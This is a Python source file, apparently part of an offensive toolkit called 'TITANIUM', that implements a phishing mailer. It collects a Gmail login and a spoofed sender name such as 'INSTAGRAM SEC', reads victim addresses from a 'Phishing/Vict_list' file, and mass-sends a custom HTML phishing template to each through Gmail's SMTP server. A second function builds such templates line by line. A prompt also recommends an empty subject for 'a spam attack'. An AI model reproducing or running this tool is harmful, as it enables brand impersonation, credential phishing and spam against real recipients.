import smtplib
from Core.Support import Font
import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

class Template:
    
    @staticmethod
    def custom():
        print(
            Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "REMEMBER TO ENABLE 'ALLOW LESS SECURE APP' ON YOUR GMAIL ACCOUNT:)\n")
        email = (input(
            Font.Color.WHITE + "INSERT YOUR EMAIL" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "EMAIL INSERTED CORRECTLY:" + email + "\n")
        password = getpass.getpass(
            Font.Color.WHITE + "INSERT YOUR EMAIL PASSWORD" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "PASSWORD INSERTED CORRECTLY\n")
        sendname = (input(
            Font.Color.WHITE + "INSERT YOUR NAME IN THIS EMAIL EX:INSTAGRAM SEC" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->"))
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "YOUR NAME IS:" + sendname + "\n")
        header = input(
            Font.Color.LIGHTWHITE_EX + "INSERT AN OBJECT (FOR A SPAM ATTACK IT'S SUGGESTED TO LEAVE THE OBJECT EMPTY:))" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "EMAIL OBJECT INSERTED CORRECTLY:" + header + "\n")

        li = input(
            "\nINSERT THE NAME OF YOUR MAIL-LIST 'WITHOUT.txt'" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        f = open("Phishing/Vict_list/" + li + ".txt", "r").readlines()
        nome = input(
            "\nINSERT THE NAME OF YOUR HTML MAIL-TEMPLATE 'WITHOUT.txt'" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        print(Font.Color.GREEN + "\n[+]" + Font.Color.WHITE + "SENDING EMAIL PLEASE WAIT" + Font.Color.GREEN + "[+]")
        for vict_email in f:
            nomefile = "Phishing/Template/CUSTOM/" + nome + ".html"
            html = open(nomefile)
            message = MIMEText(html.read(), "html")
            message['From'] = sendname + ":"
            message['To'] = vict_email.rstrip()
            message['Subject'] = header
            # SERVER DECLARATION #
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            text = message.as_string()
            server.sendmail(email, vict_email, text)
        inp = input(
            Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "EMAIL SENT PRESS ENTER TO CONTINUE" + Font.Color.WHITE + "[+]")
        
    @staticmethod   
    def creator():
        print(Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "MAIL-TEMPLATE-CREATION" + Font.Color.WHITE + "[+]")
        init = input(
            Font.Color.WHITE + "\nINSERT THE NAME OF YOUR TEMPLATE" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        name = init + ".html"
        cname = "Phishing/Template/CUSTOM/" + name
        f = open(cname, "w")
        code = input (Font.Color.WHITE + "\nINSERT THE CODE INSERT 'TITANIUM' WHEN YOU FINISH(LEAVE THE FIRST LINE EMPTY:))" + Font.Color.GREEN + "\n\n[*TITANIUM*]" + Font.Color.WHITE + "-->")
        while code != "TITANIUM":
            code = input(Font.Color.GREEN + "\n\n[*NEXT-LINE*]"+ Font.Color.WHITE + "-->")
            f.write(code + "\n")
        f.close()
        f = open(cname, "r+")
        code2 = f.read()
        f.close()
        deleting = "TITANIUM"
        repleacing = ""
        code3 = code2.replace(deleting,repleacing)
        f = open(cname, "w")
        f.write(code3)
        f.close()
        print(
                Font.Color.WHITE + "\n[+]" + Font.Color.GREEN + "FILE CREATED/MODIFIED:" + cname + Font.Color.WHITE + "[+]")
        inp = input(Font.Color.WHITE + "\nPRESS ENTER TO CONTINUE...")

